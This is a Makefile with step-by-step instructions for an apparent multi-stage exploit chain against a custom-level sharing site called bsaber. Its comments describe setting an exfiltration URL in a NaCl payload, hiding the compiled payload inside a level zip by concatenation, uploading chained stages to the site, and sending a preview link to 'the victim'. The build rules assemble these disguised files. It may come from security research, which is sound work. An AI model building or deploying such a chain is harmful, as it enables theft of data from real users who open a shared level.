# INSTRUCTIONS:
# 1) Set the NACL_SDK_ROOT environmental variable according to your NACL SDK
# 	 installation.
# 2) Set the exfil URL at stage1/payload.cc:236 as appropriate.
# 3) Build stage1.zip and upload to bsaber.
# 4) Obtain the ID for the uploaded stage1 level and replace the ID in
#    stage2/Hard.dat as appropriate.
# 5) Build stage2.zip and upload to bsaber.
# 6) Obtain the ID for the uploaded stage2 level and replace the ID in
#    stage3/Info.dat as appropriate. This needs to target the fully qualified
#    URL. You may also need to change the origin trial token if attacking an
#    origin other than http://localhost:8080.
# 7) Build stage3.zip and upload to bsaber.
# 8) Play-test stage3 such that it is publicly visible
# 	 TODO: make this actually required.
# 9) Send the preview URL for stage3 to the victim.

THIS_MAKEFILE := $(abspath $(lastword $(MAKEFILE_LIST)))

# Project Build flags
WARNINGS := -Wno-long-long -Wall -Wswitch-enum -pedantic -Werror
CXXFLAGS := -pthread -std=gnu++98 $(WARNINGS)

#
# Compute tool paths
#
GETOS := python $(NACL_SDK_ROOT)/tools/getos.py
OSHELPERS = python $(NACL_SDK_ROOT)/tools/oshelpers.py
OSNAME := $(shell $(GETOS))
RM := $(OSHELPERS) rm

PNACL_TC_PATH := $(abspath $(NACL_SDK_ROOT)/toolchain/$(OSNAME)_pnacl)
PNACL_CCX := $(PNACL_TC_PATH)/bin/pnacl-clang++
PNACL_FINALIZE := $(PNACL_TC_PATH)/bin/pnacl-finalize
CCXFLAGS := -I$(NACL_SDK_ROOT)/include
LDFLAGS := -L$(NACL_SDK_ROOT)/lib/pnacl/Release -lppapi_cpp -lppapi


clean:
	$(RM) -rf stage1/payload.pexe stage1/payload.bc stage1/bundle.zip stage1.zip stage2.zip stage3.zip

stage1/payload.bc: stage1/payload.cc
	$(PNACL_CCX) -o $@ $< -O2 $(CCXFLAGS) $(LDFLAGS)

stage1/payload.pexe: stage1/payload.bc
	$(PNACL_FINALIZE) -o $@ $<

stage1/bundle.zip: stage1/Info.dat stage1/Hard.dat stage1/cover.jpg stage1/song.egg
	cd stage1 && zip bundle.zip Info.dat Hard.dat cover.jpg song.egg

stage1.zip: stage1/payload.pexe stage1/bundle.zip
	cat $^ > $@

stage2.zip: stage2/Info.dat stage2/Hard.dat stage2/cover.jpg stage2/song.egg
	cd stage2 && zip ../stage2.zip *

stage3.zip: stage3/Info.dat stage3/Hard.dat stage3/cover.jpg stage3/song.egg
	cd stage3 && zip ../stage3.zip *
